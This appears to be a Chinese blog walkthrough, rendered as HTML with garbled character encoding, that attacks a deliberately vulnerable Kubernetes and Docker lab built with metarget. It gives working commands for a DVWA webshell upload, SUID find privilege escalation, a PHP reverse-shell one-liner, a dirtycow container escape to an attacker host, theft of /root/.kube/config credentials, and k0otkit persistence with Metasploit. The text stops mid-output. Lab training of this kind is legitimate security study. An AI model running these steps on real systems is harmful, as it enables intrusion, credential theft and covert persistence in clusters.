href="#å®‰è£…é¡¹ç›®">#</a> å®‰è£…é¡¹ç›®</h3><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#å®‰è£… git</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#å®‰è£… curl</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">curl</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#clone é¡¹ç›®</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">git</span> clone https://github.com/brant-ruan/metarget.git</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token builtin class-name">cd</span> metarget/</pre></td></tr><tr><td data-num="8"></td><td><pre>pip3 <span class="token function">install</span> -r requirements.txt</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308134513025.png" alt="image-20220308134513025"></p><p>å¦‚æœ‰å¦‚ä¸‹æŠ¥é”™</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>fatal: unable to access <span class="token string">'https://github.com/brant-ruan/metarget.git/'</span><span class="token builtin class-name">:</span> Failed to connect to github.com port <span class="token number">443</span>: Connection refused</pre></td></tr></table></figure><p>åªéœ€è¦åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œä¸€ä¸‹å³å¯</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">git</span> config --global --unset http.proxy </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">git</span> config --global --unset https.proxy</pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œä¸ºç³»ç»Ÿå®‰è£…å¸¦æœ‰ CVE-2019-5736 å®¹å™¨é€ƒé€¸æ¼æ´çš„ Dockerï¼š</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> ./metarget cnv <span class="token function">install</span> cve-2019-5736</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308152756996.png" alt="image-20220308152756996"></p><p>æ¥ç€æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œä¸ºç³»ç»Ÿå®‰è£…å¸¦æœ‰ CVE-2018-1002105 æƒé™æå‡æ¼æ´çš„ Kubernetesï¼š</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> ./metarget cnv <span class="token function">install</span> cve-2018-1002105 --domestic</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308153604914.png" alt="image-20220308153604914"></p><p>é›†ç¾¤éƒ¨ç½²æˆåŠŸåï¼Œæœ€åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œåœ¨å½“å‰é›†ç¾¤ä¸Šéƒ¨ç½²ä¸€ä¸ªå®¹å™¨åŒ– DVWAï¼š</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> ./metarget appv <span class="token function">install</span> dvwa --external</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308153649104.png" alt="image-20220308153649104"></p><p>æ•´ä¸ªäº¤äº’è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>root@ubuntu:~/metarget<span class="token comment"># sudo ./metarget cnv install cve-2019-5736</span></pre></td></tr><tr><td data-num="2"></td><td><pre>cve-2019-5736 is going to be installed</pre></td></tr><tr><td data-num="3"></td><td><pre>uninstalling current <span class="token function">docker</span> gadgets <span class="token keyword">if</span> applicable</pre></td></tr><tr><td data-num="4"></td><td><pre>installing prerequisites</pre></td></tr><tr><td data-num="5"></td><td><pre>adding <span class="token function">apt</span> repository deb <span class="token punctuation">[</span>arch<span class="token operator">=</span>amd64<span class="token punctuation">]</span> https://download.docker.com/linux/ubuntu bionic stable</pre></td></tr><tr><td data-num="6"></td><td><pre>adding <span class="token function">apt</span> repository deb http://archive.ubuntu.com/ubuntu xenial-updates universe</pre></td></tr><tr><td data-num="7"></td><td><pre>adding <span class="token function">apt</span> repository deb http://archive.ubuntu.com/ubuntu bionic-updates universe</pre></td></tr><tr><td data-num="8"></td><td><pre>installing docker-ce with <span class="token number">18.03</span>.1~ce~3-0~ubuntu version</pre></td></tr><tr><td data-num="9"></td><td><pre>cve-2019-5736 successfully installed</pre></td></tr><tr><td data-num="10"></td><td><pre>root@ubuntu:~/metarget<span class="token comment"># sudo ./metarget cnv install cve-2018-1002105 --domestic</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token function">docker</span> already installed</pre></td></tr><tr><td data-num="12"></td><td><pre>cve-2018-1002105 is going to be installed</pre></td></tr><tr><td data-num="13"></td><td><pre>uninstalling current kubernetes <span class="token keyword">if</span> applicable</pre></td></tr><tr><td data-num="14"></td><td><pre>pre-configuring</pre></td></tr><tr><td data-num="15"></td><td><pre>pre-installing</pre></td></tr><tr><td data-num="16"></td><td><pre>adding <span class="token function">apt</span> repository deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main</pre></td></tr><tr><td data-num="17"></td><td><pre>installing kubernetes-cni with <span class="token number">0.6</span>.0-00 version</pre></td></tr><tr><td data-num="18"></td><td><pre>installing kubectl with <span class="token number">1.11</span>.1-00 version</pre></td></tr><tr><td data-num="19"></td><td><pre>installing kubelet with <span class="token number">1.11</span>.1-00 version</pre></td></tr><tr><td data-num="20"></td><td><pre>installing kubeadm with <span class="token number">1.11</span>.1-00 version</pre></td></tr><tr><td data-num="21"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy-amd64:v1.11.1</pre></td></tr><tr><td data-num="22"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager-amd64:v1.11.1</pre></td></tr><tr><td data-num="23"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver-amd64:v1.11.1</pre></td></tr><tr><td data-num="24"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler-amd64:v1.11.1</pre></td></tr><tr><td data-num="25"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1</pre></td></tr><tr><td data-num="26"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/etcd-amd64:3.2.18</pre></td></tr><tr><td data-num="27"></td><td><pre>pulling registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:1.1.3</pre></td></tr><tr><td data-num="28"></td><td><pre>running kubeadm</pre></td></tr><tr><td data-num="29"></td><td><pre>installing cni plugin</pre></td></tr><tr><td data-num="30"></td><td><pre>installing flannel</pre></td></tr><tr><td data-num="31"></td><td><pre>pulling quay.mirrors.ustc.edu.cn/coreos/flannel:v0.10.0-amd64</pre></td></tr><tr><td data-num="32"></td><td><pre>generating kubernetes worker script</pre></td></tr><tr><td data-num="33"></td><td><pre>kubernetes worker script generated at tools/install_k8s_worker.sh</pre></td></tr><tr><td data-num="34"></td><td><pre>cve-2018-1002105 successfully installed</pre></td></tr><tr><td data-num="35"></td><td><pre>root@ubuntu:~/metarget<span class="token comment"># sudo ./metarget appv install dvwa --external</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token function">docker</span> already installed</pre></td></tr><tr><td data-num="37"></td><td><pre>kubernetes already installed</pre></td></tr><tr><td data-num="38"></td><td><pre>dvwa is going to be installed</pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token function">node</span> port <span class="token number">30000</span> is allocated <span class="token keyword">for</span> <span class="token for-or-select variable">service</span> <span class="token keyword">in</span> vulns_app/dvwa/dvwa/dvwa-service.yaml</pre></td></tr><tr><td data-num="40"></td><td><pre>applying yamls/k8s_metarget_namespace.yaml</pre></td></tr><tr><td data-num="41"></td><td><pre>applying vulns_app/dvwa/dvwa/dvwa-deployment.yaml</pre></td></tr><tr><td data-num="42"></td><td><pre>applying data/dvwa-service.yaml</pre></td></tr><tr><td data-num="43"></td><td><pre>dvwa successfully installed</pre></td></tr></table></figure><p>æ ¹æ®å‘½ä»¤è¡Œè¾“å‡ºçš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨æµè§ˆå™¨ä¸­è®¿é—®åˆ°å®¹å™¨å†…çš„ DVWA æœåŠ¡ï¼š</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>http://127.0.0.1:30000/login.php</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308154111690.png" alt="image-20220308154111690"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸‰è¡Œå‘½ä»¤ï¼Œå°±å®Œæˆäº†ä¸€ä¸ªå¤šå±‚æ¬¡é¶æœºç¯å¢ƒçš„æ„å»ºã€‚<br>ç¯å¢ƒçš„æ¸…ç†ä¹Ÿååˆ†ç®€å•ï¼Œåªéœ€ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./metarget appv remove dvwa</pre></td></tr><tr><td data-num="2"></td><td><pre>./metarget cnv remove cve-2018-1002105</pre></td></tr><tr><td data-num="3"></td><td><pre>./metarget cnv remove cve-2019-5736</pre></td></tr></table></figure><h3 id="é¡¹ç›®æµ‹è¯•"><a class="anchor" href="#é¡¹ç›®æµ‹è¯•">#</a> é¡¹ç›®æµ‹è¯•</h3><p>ä½¿ç”¨ <code>admin/password</code> ç™»é™† dvwa</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308154234054.png" alt="image-20220308154234054"></p><p>æŒ‰æç¤ºåˆ›å»ºæ•°æ®åº“ï¼Œå†é‡æ–°ç™»å½•å³å¯</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308155157236.png" alt="image-20220308155157236"></p><p>ç›´æ¥ä½¿ç”¨æ–‡ä»¶ä¸Šä¼ æ¥è·å– webshell<br><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308155503052.png" alt="image-20220308155503052"></p><p>ä¸Šä¼ å†°èçš„ shell è¿æ¥è·å¾— webshellï¼Œå¯ä»¥çœ‹åˆ°å½“å‰æƒé™ä¸º www-data æƒé™ã€‚</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xpdGNoMS12L2JlaGluZGVyLWNsb25lL3JlbGVhc2VzL3RhZy8wLjAuMQ==">å†°èé¡¹ç›®åœ°å€</span></p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308172603521.png" alt="image-20220308172603521"></p><p>æ¥ä¸‹æ¥è¿›è¡Œææƒæ“ä½œã€‚</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>è„ç‰›ææƒï¼šLinuxå†…æ ¸<span class="token operator">></span> <span class="token operator">=</span> <span class="token number">2.6</span>.22ï¼ˆ2007å¹´å‘è¡Œï¼‰å¼€å§‹å°±å—å½±å“äº†ï¼Œç›´åˆ°2016å¹´10æœˆ18æ—¥æ‰ä¿®å¤ã€‚</pre></td></tr><tr><td data-num="2"></td><td><pre>æŸ¥çœ‹å‘è¡Œç‰ˆæœ¬</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">cat</span> /etc/issue</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">cat</span> /etc/*-release</pre></td></tr><tr><td data-num="5"></td><td><pre>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">uname</span> -a</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308172843204.png" alt="image-20220308172843204"></p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>SUIDé…ç½®é”™è¯¯ææƒï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre>ä»¥ä¸‹å‘½ä»¤å°†å°è¯•æŸ¥æ‰¾å…·æœ‰rootæƒé™çš„SUIDçš„æ–‡ä»¶ï¼Œä¸åŒç³»ç»Ÿé€‚ç”¨äºä¸åŒçš„å‘½ä»¤</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">find</span> / -user root -perm -4000-print<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">find</span> / -user root -perm -4000-exec <span class="token function">ls</span> -ldb <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä¸ºäº†æ–¹ä¾¿æµ‹è¯•ç»™ç¯å¢ƒä¸­çš„ find åŠ äº† suid æƒé™</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">whoami</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">which</span> <span class="token function">find</span>  <span class="token comment">#æˆ–è€…ç”¨ whereis find å‘½ä»¤æŸ¥æ‰¾ä¹Ÿè¡Œ</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">chmod</span> u+s /usr/bin/find</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">ls</span> -la /usr/bin/find <span class="token comment">#æŸ¥çœ‹ SUID æƒé™æ˜¯å¦æˆåŠŸèµ‹äºˆ</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308184957887.png" alt="image-20220308184957887"></p><p>é€šè¿‡å‘½ä»¤æŸ¥æ‰¾è®¾ç½®äº† suid æƒé™çš„å¯æ‰§è¡Œç¨‹åºï¼š</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308185257546.png" alt="image-20220308185257546"></p><h4 id="findå‘½ä»¤ææƒ"><a class="anchor" href="#findå‘½ä»¤ææƒ">#</a> find å‘½ä»¤ææƒ</h4><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308190451125.png" alt="image-20220308190451125"></p><p>find çš„ - exec å‚æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ·»åŠ äº† suid æ ‡è¯†çš„ find å¯æ‰§è¡Œç¨‹åºä»¥ root èº«ä»½æ‰§è¡Œå‘½ä»¤æ¥ææƒã€‚æˆ‘ä»¬å°è¯•ä½¿ç”¨ find æ¥æ‰§è¡Œ whomai å‘½ä»¤ã€‚</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">find</span> xxx -exec <span class="token function">whoami</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308190509426.png" alt="image-20220308190509426"></p><p>æ¥ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ find æ¥æ‰§è¡Œåå¼¹ shell å‘½ä»¤ï¼Œ</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">find</span> webshell.php -exec php -r <span class="token string">'$sock=fsockopen("192.168.146.153",8000);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨å†°èæ‰§è¡Œåå¼¹ shell å‘½ä»¤æ€»æ˜¯æ˜¾ç¤ºæ“ä½œå¤±è´¥ã€‚<br><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308191647853.png" alt="image-20220308191647853"></p><h4 id="weevelyåé—¨è¿æ¥"><a class="anchor" href="#weevelyåé—¨è¿æ¥">#</a> weevely åé—¨è¿æ¥</h4><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/æ¡Œé¢<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>â””â”€<span class="token comment"># weevely                                                   </span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> weevely <span class="token number">4.0</span>.1</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Error: the following arguments are required: url, password</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Run terminal or <span class="token builtin class-name">command</span> on the target  //è¿æ¥åé—¨</pre></td></tr><tr><td data-num="8"></td><td><pre>    weevely <span class="token operator">&lt;</span>URL<span class="token operator">></span> <span class="token operator">&lt;</span>password<span class="token operator">></span> <span class="token punctuation">[</span>cmd<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Recover an existing session</pre></td></tr><tr><td data-num="11"></td><td><pre>    weevely session <span class="token operator">&lt;</span>path<span class="token operator">></span> <span class="token punctuation">[</span>cmd<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generate new agent   //ç”Ÿæˆåé—¨</pre></td></tr><tr><td data-num="14"></td><td><pre>    weevely generate <span class="token operator">&lt;</span>password<span class="token operator">></span> <span class="token operator">&lt;</span>path<span class="token operator">></span></pre></td></tr></table></figure><p>ä½¿ç”¨ weevely ç”Ÿæˆä¸€ä¸ªåé—¨æœ¨é©¬ï¼š</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/æ¡Œé¢<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>â””â”€<span class="token comment"># weevely generate test hello.php                                               2 â¨¯</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Generated <span class="token string">'hello.php'</span> with password <span class="token string">'test'</span> of <span class="token number">771</span> byte size.</pre></td></tr></table></figure><p>æŸ¥æ‰¾ç”Ÿæˆæ–‡ä»¶</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/æ¡Œé¢<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>â””â”€<span class="token comment"># find / -name hello.php</span></pre></td></tr><tr><td data-num="3"></td><td><pre>/root/æ¡Œé¢/hello.php</pre></td></tr></table></figure><p>ä¸Šä¼  hello.php</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308192247992.png" alt="image-20220308192247992"></p><p>weevely è¿æ¥æµ‹è¯•</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/æ¡Œé¢<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>â””â”€<span class="token comment"># weevely http://192.168.146.153:30000/hackable/uploads/hello.php test</span></pre></td></tr></table></figure><p>æ‰§è¡Œåå¼¹ shell æˆåŠŸäº†<br><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308192459489.png" alt="image-20220308192459489"></p><p>ææƒæˆåŠŸï¼Œè·å¾—äº† root æƒé™çš„ shellï¼Œä½†æ˜¯è¿™ä¸ª shell å¹¶ä¸æ˜¯ä¸€ä¸ªå®Œå…¨çš„ root shellï¼Œå®ƒæ˜¯ä¸€ä¸ª euid ä¸º rootï¼Œuid ä¾æ—§æ˜¯ www-data çš„ shellï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªæ˜¯è·å¾—äº†ä¸€ä¸ªæš‚æ—¶çš„ root shellã€‚</p><h3 id="å®¹å™¨æ¢æµ‹"><a class="anchor" href="#å®¹å™¨æ¢æµ‹">#</a> å®¹å™¨æ¢æµ‹ï¼š</h3><p>æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°å½“å‰ç¯å¢ƒä¸€äº›å‘½ä»¤æ˜¯æ²¡æœ‰ï¼ŒçŒœæµ‹å½“å‰ç¯å¢ƒå¯èƒ½æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œé€šè¿‡æŸ¥æ‰¾.dockerenv æ–‡ä»¶å’ŒæŸ¥çœ‹ cgroup æ¥åˆ¤æ–­å½“å‰æˆ‘ä»¬æ˜¯å¦åœ¨å®¹å™¨ä¸­ã€‚é€šè¿‡å‘½ä»¤å›æ˜¾ï¼ˆkubepodsï¼‰çŒœæµ‹æˆ‘ä»¬å½“å‰å¤„åœ¨åœ¨ä¸€ä¸ª k8s çš„ pod ä¸­ã€‚</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">ls</span> -la / <span class="token operator">|</span> <span class="token function">grep</span> dockerenv</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">cat</span> /proc/1/cgroup</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308193102735.png" alt="image-20220308193102735"></p><p>k8sã€podã€å®¹å™¨ä¹‹é—´çš„å¤§æ¦‚å…³ç³»å¯ä»¥ç®€å•ç†è§£ä¸ºï¼šé›†ç¾¤ä¸­åŒ…å«å¤šä¸ª podï¼Œpod ä¸­åŒ…å«å¤šä¸ªå®¹å™¨ã€‚</p><h3 id="å®¹å™¨é€ƒé€¸"><a class="anchor" href="#å®¹å™¨é€ƒé€¸">#</a> å®¹å™¨é€ƒé€¸ï¼š</h3><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#CVE-2016-5195 è„ç‰›æ¼æ´ï¼š</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y <span class="token function">make</span> gcc nasm</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">git</span> clone https://github.com/scumjr/dirtycow-vdso</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">cd</span> dirtycow-vdso</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">make</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308194849291.png" alt="image-20220308194849291"></p><p>è¿è¡Œ</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./0xdeadbeef attacker-ip:port</pre></td></tr></table></figure><p>æŠ¥é”™ emmmm å±®ï¼ŒæŒ–å‘ï¼Œå›æ¥å†å¡«</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308202711039.png" alt="image-20220308202711039"></p><p>å°†è·å¾—å®¿ä¸»æœºçš„åå¼¹ shellï¼Œä½¿ç”¨å®¿ä¸»æœºåå¼¹å›æ¥çš„ shell çªƒå– Kubernetes ç®¡ç†å‘˜çš„è®¿é—®å‡­æ®ï¼š</p><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">ls</span> -al /root <span class="token operator">|</span> <span class="token function">grep</span> kube</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">cat</span> /root/.kube/config</pre></td></tr></table></figure><p>å°†ä»¥ä¸Šå‡­æ®ä¿å­˜åœ¨æœ¬åœ° kubeconfig æ–‡ä»¶ï¼Œç„¶åå°è¯•ç”¨å‡­æ® è¿æ¥å¹¶æŸ¥çœ‹ Kubernetes é›†ç¾¤:</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>kubectl --kubeconfig ./kubeconfig get nodes</pre></td></tr><tr><td data-num="2"></td><td><pre>kubectl --kubeconfig ./kubeconfig get pods</pre></td></tr></table></figure><h3 id="æ§åˆ¶é›†ç¾¤æƒé™ç»´æŒ"><a class="anchor" href="#æ§åˆ¶é›†ç¾¤æƒé™ç»´æŒ">#</a> æ§åˆ¶é›†ç¾¤ + æƒé™ç»´æŒï¼š</h3><p>k0otkit å…è®¸æˆ‘ä»¬åœ¨å–å¾—é›†ç¾¤ Master èŠ‚ç‚¹æ§åˆ¶æƒé™åï¼Œå¿«é€Ÿåœ¨é›†ç¾¤æ‰€æœ‰èŠ‚ç‚¹ä¸Šåˆ›å»ºéšè”½ã€æŒä¹…çš„åå¼¹ shell åâ»”ã€‚å…‹éš† Github ä»“åº“åˆ°æ”»å‡»è€…è‡ªå·±çš„ Linux æœåŠ¡å™¨ (k0otkit ä¾èµ–äº Metasploitï¼ŒæœåŠ¡å™¨ä¸Šéœ€è¦å­˜åœ¨ msfvenom å’Œ msfconsole ä¸¤ä¸ªå·¥å…·)ï¼Œä¿®æ”¹æ”»å‡»è€… IPï¼Œç„¶åæ‰§è¡Œ pre_exp.sh:</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">git</span> clone https://github.com/brant-ruan/k0otkit</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">cd</span> k0otkit</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">chmod</span> u+x ./*.sh</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># ä¿®æ”¹ pre_exp.sh ä¸­çš„ ATTACKER_IP å˜é‡ä¸ºå®é™…æ”»å‡»è€… IP </span></pre></td></tr><tr><td data-num="5"></td><td><pre>./pre_exp.sh</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200306557.png" alt="image-20220308200306557"><br><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200247927.png" alt="image-20220308200247927"></p><p>è„šæœ¬æ‰§è¡Œå®Œæˆåï¼Œç›®å½•ä¸‹æ–°äº§ç”Ÿäº†ä¸€ä¸ª k0otkit.sh æ–‡ä»¶ï¼Œåé¢ä¼šç”¨åˆ°ã€‚</p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200404992.png" alt="image-20220308200404992"></p><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308200340465.png" alt="image-20220308200340465"></p><p>æ¥ä¸‹æ¥ï¼Œæ‰§è¡Œ <code>handle_multi_reverse_shell.sh</code> è„šæœ¬ï¼Œè¯¥è„šæœ¬å°†æ‰“å¼€ <code>msfconsole</code> å¹¶è¿è¡Œä¸€ä¸ªåå¼¹ shell ç›‘å¬æ¨¡å—:</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/æ¡Œé¢/k0otkit<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>â””â”€<span class="token comment"># ./handle_multi_reverse_shell.sh</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp</pre></td></tr><tr><td data-num="4"></td><td><pre>payload <span class="token operator">=</span><span class="token operator">></span> linux/x86/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num="5"></td><td><pre>LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0.0</span>.0.0</pre></td></tr><tr><td data-num="6"></td><td><pre>LPORT <span class="token operator">=</span><span class="token operator">></span> <span 